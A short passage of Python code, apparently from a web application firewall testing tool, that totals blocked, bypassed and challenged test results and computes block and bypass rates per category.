                by_category[cat]["bypassed"] += 1
        
        return {
            "total_tests": total,
            "blocked": blocked,
            "bypassed": bypassed,
            "bypass_attempts": len(bypass_attempts),
            "errors": sum(1 for r in baseline if r.outcome == WAFOutcome.ERROR),
            "challenged": challenged,
            "block_rate": blocked / total * 100 if total > 0 else 0,
            "bypass_rate": bypassed / total * 100 if total > 0 else 0,
            "by_category": by_category
        }
